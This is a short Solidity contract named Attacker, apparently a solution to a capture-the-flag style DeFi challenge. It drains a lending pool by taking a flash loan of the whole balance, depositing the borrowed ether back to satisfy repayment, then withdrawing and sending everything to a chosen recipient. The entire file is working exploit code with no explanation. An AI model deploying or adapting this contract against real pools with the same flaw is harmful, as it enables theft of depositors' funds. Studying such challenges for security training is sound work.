// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface targetInterface {
   function flashLoan(uint256 amount) external;
   function deposit() external payable;
   function withdraw() external;
}

contract Attacker {

    targetInterface pool;
    address recipient;

    constructor (targetInterface _target, address _recipient) {
        pool = targetInterface(_target);
        recipient = _recipient;
    }

    function attack() external {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
        (bool sent,) = recipient.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
    

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }
    
    // pool 給錢的管道
    receive() external payable {}
}